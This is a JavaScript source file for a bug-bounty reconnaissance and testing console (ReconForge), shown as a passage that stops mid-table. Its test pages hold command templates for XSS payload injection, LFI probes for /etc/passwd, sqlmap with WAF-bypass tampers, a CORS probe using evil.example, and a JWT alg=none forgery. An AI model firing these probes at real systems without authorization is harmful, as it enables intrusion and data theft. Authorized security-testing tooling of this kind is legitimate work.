/* ════════════════════════════════════════════════════════════════
   ReconForge SPA - local-first bug-bounty operations console
   Per docs/UI_UX_REDESIGN_SPEC.md
   ════════════════════════════════════════════════════════════════ */

(function () {
"use strict";

// ── State ────────────────────────────────────────────────────────
const state = {
    booted:         false,
    authed:         false,
    user:           null,
    role:           null,
    apiState:       null,             // last /api/state response
    target:         null,             // active target domain
    workspace:      null,             // workspace name
    cyberbrainPath: null,             // CyberBrain export root path
    riskMode:       "passive",        // "passive" | "active" | "aggressive"
    // Intake form draft. Bound to every field on the Intake page and updated
    // on each keystroke so a re-render (e.g. selecting a risk mode) never wipes
    // in-progress input. Seeded from persisted state on boot.
    intakeDraft:    { target: "", program: "", workspace: "", cyberbrain: "", scope: "", oos: "" },
    phase:          "target-intake",  // current methodology phase
    guideMode:      false,             // optional helper text toggle
    consoleEvents:  [],
    consoleState:   "expanded",        // "expanded" | "minimized"
    palette:        { open: false, query: "", selected: 0, items: [] },
    pollHandle:     null,
    config:         null,              // /api/config cache (Settings page)
};

const LS = {
    get(k, fallback) {
        try { const v = localStorage.getItem("rf:" + k); return v === null ? fallback : JSON.parse(v); }
        catch (_) { return fallback; }
    },
    set(k, v) {
        try { localStorage.setItem("rf:" + k, JSON.stringify(v)); } catch (_) {}
    },
};

// ── Navigation config ────────────────────────────────────────────
const NAV = [
    { id: "dashboard", title: "Dashboard", items: [
        { route: "dashboard",   label: "Mission Control" },
    ]},
    { id: "target", title: "Target", items: [
        { route: "intake",      label: "Intake"          },
        { route: "scope",       label: "Scope"           },
    ]},
    { id: "recon", title: "Recon", items: [
        { route: "passive",     label: "Passive Recon"   },
        { route: "active",      label: "Active Recon"    },
        { route: "urls",        label: "URL Collection"  },
        { route: "js",          label: "JS Mining"       },
    ]},
    { id: "map", title: "Map", items: [
        { route: "surface",     label: "Asset Map"       },
        { route: "fingerprint", label: "Tech Fingerprint" },
        { route: "params",      label: "Parameter Inventory" },
    ]},
    { id: "test", title: "Test", items: [
        { route: "xss",         label: "XSS"             },
        { route: "cors",        label: "CORS"            },
        { route: "lfi",         label: "LFI"             },
        { route: "sqli",        label: "SQLi"            },
        { route: "auth",        label: "Auth / API"      },
        { route: "takeover",    label: "Subdomain Takeover" },
        { route: "exposure",    label: "Sensitive Exposure" },
    ]},
    { id: "evidence", title: "Evidence", items: [
        { route: "findings",    label: "Findings"        },
        { route: "notes",       label: "Notes"           },
        { route: "artifacts",   label: "Artifacts"       },
        { route: "timeline",    label: "Timeline"        },
    ]},
    { id: "report", title: "Report", items: [
        { route: "export",      label: "Export"          },
        { route: "cyberbrain",  label: "CyberBrain Sync" },
    ]},
    { id: "ops", title: "Operations", items: [
        { route: "jobs",        label: "Jobs"            },
        { route: "queue",       label: "Queue"           },
        { route: "workers",     label: "Workers"         },
        { route: "monitors",    label: "Monitors"        },
        { route: "resources",   label: "Resources"       },
    ]},
    { id: "admin", title: "Admin", items: [
        { route: "settings",    label: "Settings"        },
        { route: "users",       label: "Users"           },
        { route: "backups",     label: "Backups"         },
        { route: "logs",        label: "System Logs"     },
    ]},
];

const KILL_CHAIN = [
    { id: "target",   label: "Target",   routes: ["intake"] },
    { id: "scope",    label: "Scope",    routes: ["scope"] },
    { id: "passive",  label: "Passive",  routes: ["passive", "urls"] },
    { id: "active",   label: "Active",   routes: ["active"] },
    { id: "map",      label: "Map",      routes: ["surface", "fingerprint", "params", "js"] },
    { id: "test",     label: "Test",     routes: ["xss", "cors", "lfi", "sqli", "auth", "takeover", "exposure"] },
    { id: "evidence", label: "Evidence", routes: ["findings", "notes", "artifacts", "timeline"] },
    { id: "report",   label: "Report",   routes: ["export", "cyberbrain"] },
];

// ── API helper ───────────────────────────────────────────────────
async function api(method, path, body) {
    const opts = {
        method, credentials: "same-origin",
        headers: { "Content-Type": "application/json" },
    };
    if (body !== undefined) opts.body = JSON.stringify(body);
    let resp;
    try { resp = await fetch(path, opts); }
    catch (e) { return { ok: false, status: 0, error: String(e) }; }
    let data = null;
    try { data = await resp.json(); } catch (_) {}
    return { ok: resp.ok, status: resp.status, data };
}

// ── Bootstrap ────────────────────────────────────────────────────
async function boot() {
    // Restore from localStorage
    state.guideMode      = LS.get("guideMode", false);
    state.consoleState   = LS.get("consoleState", "expanded");
    state.target         = LS.get("target", null);
    state.workspace      = LS.get("workspace", null);
    state.cyberbrainPath = LS.get("cyberbrainPath", null);
    state.riskMode       = LS.get("riskMode", "passive");
    // Seed the intake draft so a returning operator sees their saved target.
    state.intakeDraft.target     = state.target || "";
    state.intakeDraft.workspace  = state.workspace || "";
    state.intakeDraft.cyberbrain = state.cyberbrainPath || "";

    const r = await api("GET", "/api/state");
    if (r.status === 401 || !r.ok) {
        showLogin();
        return;
    }
    state.authed   = true;
    state.apiState = r.data && (r.data.data || r.data);
    state.user     = (state.apiState && state.apiState.session && state.apiState.session.username) || null;
    state.role     = (state.apiState && state.apiState.session && state.apiState.session.role) || null;
    showShell();
    startPolling();
    consoleLog("info", "operator authenticated: " + (state.user || "—"));
}

function showLogin() {
    document.getElementById("login-screen").style.display = "";
    document.getElementById("app-shell").hidden = true;
    const u = document.getElementById("login-user");
    if (u) setTimeout(() => u.focus(), 50);
}

function showShell() {
    document.getElementById("login-screen").style.display = "none";
    document.getElementById("app-shell").hidden = false;
    renderShellChrome();
    renderSidebar();
    renderKillchain();
    renderConsole();
    applyGuideState();
    handleRouteChange();
    state.booted = true;
}

// ── Login ────────────────────────────────────────────────────────
async function login() {
    const u = document.getElementById("login-user").value;
    const p = document.getElementById("login-pass").value;
    const err = document.getElementById("login-error");
    err.textContent = "";
    if (!u || !p) { err.textContent = "Operator and passphrase required."; return; }
    const r = await api("POST", "/api/login", { username: u, password: p });
    if (r.ok && r.data && r.data.success) {
        state.user = u;
        state.role = (r.data.data && r.data.data.role) || null;
        state.authed = true;
        await boot();
    } else {
        err.textContent = (r.data && r.data.message) || "Authentication failed.";
    }
}

async function logout() {
    try { await api("POST", "/api/logout"); } catch (_) {}
    state.authed = false; state.user = null; state.role = null;
    if (state.pollHandle) { clearInterval(state.pollHandle); state.pollHandle = null; }
    showLogin();
}

// ── Polling ──────────────────────────────────────────────────────
function startPolling() {
    if (state.pollHandle) clearInterval(state.pollHandle);
    state.pollHandle = setInterval(async () => {
        const r = await api("GET", "/api/state");
        if (r.status === 401) { logout(); return; }
        if (r.ok) {
            state.apiState = r.data && (r.data.data || r.data);
            // Re-render only operational pages, and never while the operator is
            // typing into a field on that page — a poll-driven innerHTML swap
            // would wipe the in-progress input.
            const route = currentRoute();
            const ae = document.activeElement;
            const editing = ae && (ae.tagName === "INPUT" || ae.tagName === "TEXTAREA");
            if (!editing && ["dashboard","jobs","queue","workers","monitors","resources"].includes(route)) {
                renderWorkspace();
            }
            renderKillchain();
        }
    }, 8000);
}

// ── Routing ──────────────────────────────────────────────────────
function currentRoute() {
    const h = (location.hash || "").replace(/^#\/?/, "");
    return h || "intake";
}

function navigateTo(route) {
    location.hash = "#/" + route;
}

window.addEventListener("hashchange", handleRouteChange);

function handleRouteChange() {
    if (!state.authed) return;
    const route = currentRoute();
    state.phase = routeToPhase(route);
    document.querySelectorAll(".sb-item").forEach(el => {
        el.classList.toggle("active", el.dataset.route === route);
    });
    document.getElementById("hdr-phase").textContent = phaseLabel(state.phase);
    renderKillchain();
    renderWorkspace();
    if (route === "settings") ensureConfig();
}

function routeToPhase(route) {
    for (const step of KILL_CHAIN) {
        if (step.routes.includes(route)) return step.id;
    }
    if (["dashboard"].includes(route)) return "dashboard";
    if (["settings","users","backups","logs"].includes(route)) return "admin";
    if (["jobs","queue","workers","monitors","resources"].includes(route)) return "operations";
    return "target";
}

function phaseLabel(phase) {
    return {
        "target":     "target intake",
        "scope":      "scope validation",
        "passive":    "passive recon",
        "active":     "active recon",
        "map":        "asset mapping",
        "test":       "vulnerability testing",
        "evidence":   "evidence collection",
        "report":     "report export",
        "dashboard":  "mission control",
        "operations": "operations",
        "admin":      "admin",
    }[phase] || phase;
}

// ── Sidebar ──────────────────────────────────────────────────────
function renderSidebar() {
    const el = document.getElementById("sidebar");
    if (!el) return;
    const current = currentRoute();
    let html = "";
    for (const group of NAV) {
        html += `<div class="sb-group">`;
        html += `<div class="sb-group-title">${group.title}</div>`;
        for (const item of group.items) {
            const active = item.route === current;
            const stateMark = sidebarItemState(item.route);
            html += `<div class="sb-item ${active ? "active" : ""}" data-route="${item.route}" onclick="ReconForge.go('${item.route}')">
              <span>${item.label}</span>
              <span class="sb-state" data-s="${stateMark}"></span>
            </div>`;
        }
        html += `</div>`;
    }
    el.innerHTML = html;
}

function sidebarItemState(route) {
    // Simple state derivation. Items can be: current / complete / processing / inactive / error
    if (route === currentRoute()) return "current";
    // Mark "intake" complete if we have a target stored
    if (route === "intake" && state.target) return "complete";
    if (route === "scope"  && state.target && state.workspace) return "complete";
    return "";
}

// ── Header chrome ────────────────────────────────────────────────
function renderShellChrome() {
    document.getElementById("hdr-target").textContent    = state.target    || "—";
    document.getElementById("hdr-workspace").textContent = state.workspace || "—";
    document.getElementById("hdr-user").textContent      = state.user      || "—";
    const risk = document.getElementById("hdr-risk");
    risk.dataset.risk = state.riskMode;
    risk.textContent = state.riskMode.toUpperCase();
    document.getElementById("hdr-phase").textContent = phaseLabel(routeToPhase(currentRoute()));
}

// ── Kill-chain rail ──────────────────────────────────────────────
function renderKillchain() {
    const el = document.getElementById("killchain-rail");
    if (!el) return;
    const route = currentRoute();
    const stepStates = {};
    for (const step of KILL_CHAIN) {
        if (step.routes.includes(route)) stepStates[step.id] = "current";
        else stepStates[step.id] = "";
    }
    // Mark completed steps based on target/workspace presence
    if (state.target) {
        stepStates.target = stepStates.target === "current" ? "current" : "complete";
    }
    if (state.target && state.workspace) {
        stepStates.scope = stepStates.scope === "current" ? "current" : "complete";
    }
    let html = "";
    KILL_CHAIN.forEach((s, i) => {
        const st = stepStates[s.id] || "";
        const click = `ReconForge.go('${s.routes[0]}')`;
        html += `<span class="kc-step" data-state="${st}" onclick="${click}">
          <span class="kc-dot"></span>${s.label}
        </span>`;
        if (i < KILL_CHAIN.length - 1) html += `<span class="kc-sep">›</span>`;
    });
    el.innerHTML = html;
}

// ── Workspace router ─────────────────────────────────────────────
function renderWorkspace() {
    const route = currentRoute();
    const fn = PAGES[route] || pageNotFound(route);
    const html = fn();
    document.getElementById("workspace").innerHTML = html;
}

// ── Page registry ────────────────────────────────────────────────
const PAGES = {};

PAGES.dashboard = function () {
    const s = state.apiState || {};
    const stats   = s.stats || {};
    const running = Array.isArray(s.running_jobs) ? s.running_jobs.length : (s.running_count || 0);
    const queued  = Array.isArray(s.queued_jobs)  ? s.queued_jobs.length  : (s.queued_count || 0);
    const subs    = stats.total_subdomains || 0;
    const targets = stats.total_domains    || 0;
    const findings = stats.total_findings  || 0;

    return `
      ${renderWorkspaceHead("Mission Control", "Dashboard", "")}
      ${renderMetrics([
        { label: "Running Jobs",   value: running,  kind: running ? "processing" : "" },
        { label: "Queued",         value: queued,   kind: queued  ? "processing" : "" },
        { label: "Tracked Targets",value: targets },
        { label: "Subdomains",     value: subs },
        { label: "Findings",       value: findings, kind: findings ? "success" : "" },
        { label: "Risk Mode",      value: state.riskMode.toUpperCase(), kind: state.riskMode === "aggressive" ? "error" : "" },
      ])}
      <div class="workspace-cols">
        <div>
          ${renderTargetStatusPanel()}
          ${panel("Active jobs", running ? renderJobsTable(s.running_jobs || []) : `<div class="tbl-empty">No jobs running. Submit a target from Operations → Jobs.</div>`)}
        </div>
        <div>
          ${renderReconChecklist()}
          ${renderEvidenceTimeline(state.consoleEvents.slice(0, 8))}
        </div>
      </div>
    `;
};

PAGES.intake = function () {
    const d = state.intakeDraft;
    return `
      ${renderWorkspaceHead("Target Intake", "Target", "Define the engagement before recon begins.")}
      <div class="workspace-cols">
        <div>
          ${panel("Engagement", `
            <form onsubmit="event.preventDefault(); ReconForge.saveIntake(); return false;">
              <div class="form-grid">
                <div>
                  <label class="form-label">Target domain</label>
                  <input id="intake-target" type="text" value="${escapeAttr(d.target)}" placeholder="example.com" spellcheck="false">
                </div>
                <div>
                  <label class="form-label">Program name</label>
                  <input id="intake-program" type="text" value="${escapeAttr(d.program)}" placeholder="Acme Corp" spellcheck="false">
                </div>
                <div>
                  <label class="form-label">Workspace name</label>
                  <input id="intake-workspace" type="text" value="${escapeAttr(d.workspace)}" placeholder="acme-com" spellcheck="false">
                </div>
                <div>
                  <label class="form-label">CyberBrain path</label>
                  <input id="intake-cyberbrain" type="text" value="${escapeAttr(d.cyberbrain)}" placeholder="CyberBrain/BugBounty/acme.com">
                </div>
                <div class="full">
                  <label class="form-label">Scope rules</label>
                  <textarea id="intake-scope" rows="3" placeholder="*.example.com&#10;api.example.com&#10;app.example.com" style="width:100%; font-family: var(--font-mono);">${escapeHTML(d.scope)}</textarea>
                </div>
                <div class="full">
                  <label class="form-label">Out of scope</label>
                  <textarea id="intake-oos" rows="2" placeholder="careers.example.com&#10;status.example.com" style="width:100%; font-family: var(--font-mono);">${escapeHTML(d.oos)}</textarea>
                </div>
                <div class="full">
                  <label class="form-label">Risk mode</label>
                  <div class="radio-row">
                    ${riskPill("passive",     "Passive only",                state.riskMode === "passive")}
                    ${riskPill("active",      "Passive + Active",            state.riskMode === "active")}
                    ${riskPill("aggressive",  "Full authorized testing",     state.riskMode === "aggressive")}
                  </div>
                </div>
              </div>
              <div class="spacer-md"></div>
              <div style="display:flex; gap:8px;">
                <button type="submit" class="btn btn-primary">▸ Load Target</button>
                <button type="button" class="btn btn-ghost" onclick="ReconForge.clearIntake()">Reset</button>
              </div>
            </form>
          `)}
          ${state.guideMode ? guidePanel("Why this matters", "Defining the target, scope, and risk posture before any probing aligns every downstream command with the authorization boundary. The Risk Mode selector classifies which workflows surface in the methodology panes; scope_guard still enforces program scope on every tool dispatch.") : ""}
        </div>
        <div>
          ${renderTargetStatusPanel()}
          ${panel("Operator", `
            <div class="status-panel">
              <dt>Operator</dt><dd>${escapeHTML(state.user || "—")} <span class="badge badge-muted">${escapeHTML(state.role || "—")}</span></dd>
              <dt>Workspace</dt><dd>${escapeHTML(state.workspace || "—")}</dd>
              <dt>Export root</dt><dd class="mono" style="font-size:11px;">${escapeHTML(state.cyberbrainPath || "—")}</dd>
            </div>
          `)}
        </div>
      </div>
    `;
};

PAGES.scope = function () {
    return `
      ${renderWorkspaceHead("Scope Validation", "Target", "Confirm authorization before any active probe.")}
      <div class="workspace-cols">
        <div>
          ${renderTargetStatusPanel()}
          ${panel("Scope rules", `
            <div class="mono" style="font-size:12px;">
              <div class="text-success">in scope</div>
              <ul style="list-style: none; padding-left: 14px;">
                ${(state.target ? [`*.${state.target}`, state.target] : []).map(s => `<li>• ${escapeHTML(s)}</li>`).join("") || `<li class="text-mute">— load a target first</li>`}
              </ul>
              <div class="muted-line"></div>
              <div class="text-error">out of scope</div>
              <ul style="list-style: none; padding-left: 14px; color: var(--text-muted);">
                <li>(none declared)</li>
              </ul>
            </div>
          `)}
        </div>
        <div>
          ${panel("Scope guard", `
            <div class="status-panel">
              <dt>Enforcement</dt><dd><span class="badge badge-success">ACTIVE</span></dd>
              <dt>Module</dt><dd class="mono" style="font-size:11px;">scope_guard.py</dd>
              <dt>Hook</dt><dd>per-tool dispatch</dd>
              <dt>OOS Action</dt><dd><span class="badge badge-error">REFUSE</span></dd>
            </div>
            <div class="form-help">Every command fired through ReconForge is validated against the scope module before subprocess spawn. This UI cannot override that check.</div>
          `)}
        </div>
      </div>
    `;
};

PAGES.passive = function () { return renderMethodologyPage("passive", "Passive Recon", "Recon", "passive", [
    { label: "subfinder all-source",  cmd: `subfinder -d ${tgt()} -all -recursive -silent -o subs/sf.txt`, risk: "passive", note: "Expand the target surface from public passive sources." },
    { label: "amass passive",         cmd: `amass enum -passive -d ${tgt()} -o subs/am.txt`, risk: "passive" },
    { label: "github-subdomains",     cmd: `github-subdomains -d ${tgt()} -t $GITHUB_TOKEN -e -raw -o subs/gh.txt`, risk: "passive" },
    { label: "crt.sh certificate transparency", cmd: `curl -s "https://crt.sh/?q=%25.${tgt()}&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > subs/crt.txt`, risk: "passive" },
]); };

PAGES.active = function () { return renderMethodologyPage("active", "Active Recon", "Recon", "active", [
    { label: "puredns resolve",   cmd: `puredns resolve subs/all.txt -r resolvers.txt --rate-limit 1000 -w resolved.txt`, risk: "active" },
    { label: "naabu top-1000",    cmd: `naabu -l resolved.txt -tp 1000 -rate 5000 -silent -o ports.txt`, risk: "active" },
    { label: "httpx enrichment",  cmd: `httpx -l ports.txt -silent -title -tech-detect -status-code -follow-redirects -ip -cname -cdn -jarm -j -o httpx.jsonl`, risk: "active" },
]); };

PAGES.urls = function () { return renderMethodologyPage("urls", "URL Collection", "Recon", "passive", [
    { label: "gau archive harvest",    cmd: `echo ${tgt()} | gau --subs --threads 200 | anew gau.txt`, risk: "passive" },
    { label: "waybackurls",            cmd: `echo ${tgt()} | waybackurls | anew way.txt`, risk: "passive" },
    { label: "extract parameter keys", cmd: `cat urls.txt | unfurl -u keys | sort -u > params.txt`, risk: "passive" },
]); };

PAGES.js = function () { return renderMethodologyPage("js", "JavaScript Mining", "Map", "active", [
    { label: "jsluice URL extraction",    cmd: `for f in js-bodies/*.js; do jsluice urls "$f"; done | sort -u > js-urls.txt`, risk: "active", note: "Surface hardcoded endpoints + API paths from bundled JS." },
    { label: "jsluice secret extraction", cmd: `for f in js-bodies/*.js; do jsluice secrets "$f"; done > js-secrets.jsonl`, risk: "passive" },
    { label: "trufflehog filesystem",     cmd: `trufflehog filesystem ./js-bodies --json --no-update --only-verified > trufflehog.jsonl`, risk: "passive" },
]); };

PAGES.surface = function () {
    const subs = (state.apiState && state.apiState.targets && state.apiState.targets.length)
        ? state.apiState.targets.slice(0, 12).map(t => t.domain || t)
        : (state.target ? [`api.${state.target}`, `admin.${state.target}`, `static.${state.target}`] : []);
    let tree;
    if (!subs.length) {
        tree = `<span class="surface-mute">(no surface mapped yet)</span>`;
    } else {
        tree = `<span class="surface-host">${escapeHTML(state.target || "target")}</span>\n`;
        subs.forEach((s, i) => {
            const last = i === subs.length - 1;
            const branch = last ? "└──" : "├──";
            tree += `<span class="surface-mute">${branch}</span> <span class="surface-host">${escapeHTML(s)}</span>\n`;
        });
    }
    return `
      ${renderWorkspaceHead("Asset Map", "Map", "Tree view of mapped hosts and paths.")}
      ${panel("Surface tree", `<div class="surface-tree">${tree}</div>`)}
      ${state.guideMode ? guidePanel("Why a tree", "The tree representation is readable, diff-friendly, and exports cleanly to markdown. Graph visualization can come later when the asset count makes it worth the cognitive overhead.") : ""}
    `;
};

PAGES.fingerprint = function () { return renderMethodologyPage("fingerprint", "Tech Fingerprint", "Map", "active", [
    { label: "httpx tech-detect (full)", cmd: `httpx -l alive.txt -tech-detect -title -server -jarm -json -o httpx-tech.jsonl`, risk: "active" },
    { label: "tlsx SAN/CN harvest",      cmd: `tlsx -l hosts.txt -san -cn -silent -resp-only -o tls.txt`, risk: "active" },
    { label: "cdncheck classification",  cmd: `cdncheck -i ips.txt -resp -o cdn.txt`, risk: "passive" },
]); };

PAGES.params = function () { return renderMethodologyPage("params", "Parameter Inventory", "Map", "active", [
    { label: "arjun behavioral diff",    cmd: `arjun -i alive.txt -t 10 --rate-limit 5 -oT arjun-params.txt`, risk: "active", note: "Behavioral diff is slow but accurate. Throttle aggressively." },
    { label: "paramspider archives",     cmd: `paramspider -d ${tgt()} -s | anew paramspider.txt`, risk: "passive", note: "ParamSpider v3 dropped --exclude/--output; -s streams URLs to stdout (also saved to results/)." },
    { label: "x8 hidden parameters",     cmd: `x8 -u https://${tgt()} -w $WORDLIST_DIR/burp-parameter-names.txt --output-format url`, risk: "active" },
]); };

PAGES.xss = function () { return renderMethodologyPage("xss", "XSS", "Test", "active", [
    { label: "Gxss reflection sieve",   cmd: `cat gf-xss.txt | Gxss -p Xss -c 100`, risk: "active" },
    { label: "dalfox pipeline",         cmd: `cat reflectors.txt | dalfox pipe -b $BLIND_XSS_URL --silence -o xss-results.txt`, risk: "aggressive" },
    { label: "hard-confirm grep",       cmd: `cat reflectors.txt | qsreplace '"><script>alert(1)</script>' | while read u; do curl -s --path-as-is --insecure "$u" | grep -qs '<script>alert(1)</script>' && echo "VULN: $u"; done`, risk: "aggressive", note: "Triggers on verbatim payload reflection. Zero false positives." },
]); };

PAGES.cors = function () { return renderMethodologyPage("cors", "CORS", "Test", "active", [
    { label: "nuclei CORS templates", cmd: `nuclei -l alive.txt -tags cors -severity medium,high -rl 50 -c 5 -jsonl -o cors.jsonl`, risk: "active" },
    { label: "Origin reflection probe", cmd: `for u in $(cat alive.txt); do curl -sIH "Origin: https://evil.example" "$u" | grep -i "access-control-allow-origin: https://evil.example" && echo "REFLECTED $u"; done`, risk: "active" },
]); };

PAGES.lfi = function () { return renderMethodologyPage("lfi", "LFI", "Test", "aggressive", [
    { label: "/etc/passwd probe",   cmd: `cat gf-lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI %"'`, risk: "aggressive" },
    { label: "PHP wrappers",        cmd: `cat gf-lfi.txt | qsreplace "php://filter/convert.base64-encode/resource=index"`, risk: "aggressive" },
]); };

PAGES.sqli = function () { return renderMethodologyPage("sqli", "SQLi", "Test", "aggressive", [
    { label: "sqlmap from gf list",       cmd: `sed 's/=[^&]*/=FUZZ/g' gf-sqli.txt | sort -u | sqlmap -m - --batch --random-agent --level 5 --risk 3 --dbs`, risk: "aggressive", note: "Intrusive. Confirm program rules on automated SQLi before firing." },
    { label: "tamper stack (WAF bypass)", cmd: `sqlmap -u "URL" -p param --tamper=between,randomcase,space2comment,charunicodeencode --random-agent`, risk: "aggressive" },
]); };

PAGES.auth = function () { return renderMethodologyPage("auth", "Auth / API", "Test", "active", [
    { label: "JWT alg=none probe",   cmd: `# Strip signature, send forged payload\\npython3 -c "import attack.jwt as j; print(j.run('${tgt()}', {'token': '$TOKEN', 'endpoint': '$ENDPOINT'}).to_dict())"`, risk: "active" },
    { label: "GraphQL introspection",cmd: `curl -sS -X POST "https://${tgt()}/graphql" -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}'`, risk: "passive" },
    { label: "Two-account IDOR diff",cmd: `bash scripts/vuln/idor.sh   # AUTH_A and AUTH_B required`, risk: "active" },
]); };

PAGES.takeover = function () { return renderMethodologyPage("takeover", "Subdomain Takeover", "Test", "active", [
    { label: "nuclei takeover sweep", cmd: `nuclei -l subs/all.txt -tags takeover -severity high,critical -rl 50 -c 5 -jsonl -o takeover.jsonl`, risk: "active" },
    { label: "manual CNAME audit",    cmd: `dnsx -l subs/all.txt -cname -silent -resp | grep -iE 'github\\.io|herokuapp|s3\\.amazonaws|cloudfront|fastly|azurewebsites|netlify'`, risk: "passive" },
]); };

PAGES.exposure = function () { return renderMethodologyPage("exposure", "Sensitive Exposure", "Test", "passive", [
    { label: "nuclei exposure tags", cmd: `nuclei -l alive.txt -tags exposure,config,backup,git -severity medium,high,critical -jsonl -o exposure.jsonl`, risk: "active" },
    { label: "archive interesting files", cmd: `gau ${tgt()} | grep -iE "\\.(env|bak|sql|tar\\.gz|7z|backup|secret|config|log)$" > interesting.txt`, risk: "passive" },
]); };

PAGES.findings = function () {
    return `
      ${renderWorkspaceHead("Findings", "Evidence", "Confirmed and in-review submissions.")}
      ${panel("Findings board", `<div class="tbl-empty">No findings yet. They'll appear here as the agent layer + report scripts produce them.</div>`)}
      ${state.guideMode ? guidePanel("Pipeline", "Confirmed findings flow: scripts/vuln/* → /api/v2 findings → this board → scripts/report/draft-report.sh → CyberBrain Export. Status moves through draft → review → submitted → triaged.") : ""}
    `;
};

PAGES.notes = function () {
    return `
      ${renderWorkspaceHead("Notes", "Evidence", "Session notes and operator commentary.")}
      ${panel("Session notes", `<textarea style="width:100%; min-height: 240px; font-family: var(--font-mono);" placeholder="paste payloads, observations, follow-ups…"></textarea><div class="spacer-sm"></div><div style="display:flex; gap:8px;"><button class="btn btn-primary" onclick="ReconForge.toast('Notes saved to workspace.', 'success')">▸ Save</button><button class="btn btn-ghost" onclick="ReconForge.toast('Note exported to CyberBrain.', 'success')">Export to CyberBrain</button></div>`)}
    `;
};

PAGES.artifacts = function () {
    return `
      ${renderWorkspaceHead("Artifacts", "Evidence", "Screenshots, raw req/resp, HAR captures.")}
      ${panel("Per-run artifacts", `<div class="tbl-empty">Drop files via scripts/report/evidence-pack.sh.</div>`)}
    `;
};

PAGES.timeline = function () {
    return `
      ${renderWorkspaceHead("Timeline", "Evidence", "Chronological log of operator and system events.")}
      ${renderEvidenceTimeline(state.consoleEvents)}
    `;
};

PAGES.export = function () {
    return `
      ${renderWorkspaceHead("Report Export", "Report", "Bundle the run into a submission-ready report.")}
      <div class="workspace-cols">
        <div>
          ${panel("Per-platform draft", `
            <div class="form-grid">
              <div class="full">
                <label class="form-label">Platform</label>
                <div class="radio-row">
                  ${["hackerone","intigriti","bugcrowd","yeswehack","synack"].map(p =>
                    `<label class="radio-pill"><input type="radio" name="platform" value="${p}" style="display:none;" onchange="ReconForge.setPlatform('${p}')">${p}</label>`
                  ).join("")}
                </div>
              </div>
              <div>
                <label class="form-label">Vuln class</label>
                <input id="export-class" type="text" placeholder="ssrf, xss, idor…">
              </div>
              <div>
                <label class="form-label">CVSS vector</label>
                <input id="export-cvss" type="text" placeholder="AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N" class="mono">
              </div>
            </div>
            <div class="spacer-md"></div>
            <div style="display:flex; gap:8px;">
              <button class="btn btn-primary" onclick="ReconForge.toast('Draft generated via scripts/report/draft-report.sh', 'success')">▸ Generate draft</button>
              <button class="btn btn-ghost" onclick="ReconForge.toast('Evidence pack queued.', 'success')">Pack evidence</button>
              <button class="btn btn-ghost" onclick="ReconForge.toast('Dup check queued.', 'info')">Dup check</button>
            </div>
          `)}
        </div>
        <div>
          ${renderCyberBrainPanel()}
        </div>
      </div>
    `;
};

PAGES.cyberbrain = function () {
    return `
      ${renderWorkspaceHead("CyberBrain Sync", "Report", "Push workspace artifacts into the Obsidian vault.")}
      <div class="workspace-cols">
        <div>
          ${renderCyberBrainPanel()}
        </div>
        <div>
          ${panel("Sync controls", `
            <div class="status-panel">
              <dt>Vault root</dt><dd class="mono" style="font-size:11px;">${escapeHTML(state.cyberbrainPath || "—")}</dd>
              <dt>Last sync</dt><dd class="text-mute">never</dd>
              <dt>Pending</dt><dd>0 files</dd>
            </div>
            <div class="spacer-md"></div>
            <button class="btn btn-primary" onclick="ReconForge.toast('CyberBrain sync triggered.', 'success')">▸ Sync now</button>
          `)}
        </div>
      </div>
    `;
};

PAGES.jobs = function () {
    const s = state.apiState || {};
    const running = s.running_jobs || [];
    const queued  = s.queued_jobs  || [];
    const done    = s.completed_jobs|| [];
    return `
      ${renderWorkspaceHead("Jobs", "Operations", "Running, queued, and completed pipeline runs.")}
      ${panel("Submit new scan", `
        <form onsubmit="event.preventDefault(); ReconForge.submitJob(); return false;" style="display:flex; gap:8px;">
          <input id="job-domain" type="text" placeholder="example.com" spellcheck="false" style="flex:1;">
          <button type="submit" class="btn btn-primary">▸ Submit</button>
        </form>
      `)}
      ${panel("Running", running.length ? renderJobsTable(running) : `<div class="tbl-empty">No running jobs.</div>`)}
      ${panel("Queued", queued.length ? renderJobsTable(queued) : `<div class="tbl-empty">Queue empty.</div>`)}
      ${panel("Recent (last 20)", done.length ? renderJobsTable(done) : `<div class="tbl-empty">No completed jobs yet.</div>`)}
    `;
};

PAGES.queue = function () {
    const s = state.apiState || {};
    const queued = s.queued_jobs || [];
    return `
      ${renderWorkspaceHead("Queue", "Operations", "Pending job queue.")}
      ${panel("Pending", queued.length ? renderJobsTable(queued) : `<div class="tbl-empty">Queue empty.</div>`)}
    `;
};

PAGES.workers = function () {
    const s = state.apiState || {};
    const workers = s.workers || {};
    const rows = Object.keys(workers).map(k => {
        const w = workers[k] || {};
        return `<tr><td class="mono">${escapeHTML(k)}</td><td>${w.running ?? 0}</td><td>${w.waiting ?? 0}</td><td>${w.max_concurrent ?? "—"}</td></tr>`;
    }).join("");
    return `
      ${renderWorkspaceHead("Workers", "Operations", "Per-tool concurrency gates.")}
      ${panel("Tool gates", rows ? `<table class="tbl"><thead><tr><th>Tool</th><th>Running</th><th>Waiting</th><th>Max</th></tr></thead><tbody>${rows}</tbody></table>` : `<div class="tbl-empty">No workers reported.</div>`)}
    `;
};

PAGES.monitors = function () {
    const rows = (state.apiState && state.apiState.schedule) || [];
    const table = rows.length ? `
      <table class="tbl">
        <thead><tr><th>Target</th><th>Status</th><th>Cadence</th><th>Next run</th><th>Quiet</th><th>Last Δ</th><th></th></tr></thead>
        <tbody>
          ${rows.map(r => `
            <tr>
              <td class="mono">${escapeHTML(r.domain)}</td>
              <td>${r.enabled ? `<span class="badge badge-success">ON</span>` : `<span class="badge badge-muted">PAUSED</span>`}</td>
              <td class="mono">${fmtInterval(r.interval_seconds)}</td>
              <td class="mono text-sec">${escapeHTML(fmtWhen(r.next_run_at))}</td>
              <td class="mono text-sec">${fmtQuiet(r.last_new_asset_at)}</td>
              <td>${r.last_delta_count > 0 ? `<span class="badge badge-success">+${r.last_delta_count}</span>` : `<span class="text-mute">0</span>`}</td>
              <td style="text-align:right; white-space:nowrap;">
                <button class="btn btn-ghost btn-sm" onclick="ReconForge.toggleMonitor(${r.id}, ${r.enabled ? 0 : 1})">${r.enabled ? "pause" : "resume"}</button>
                <button class="btn btn-ghost btn-sm" onclick="ReconForge.removeMonitor(${r.id})">remove</button>
              </td>
            </tr>
          `).join("")}
        </tbody>
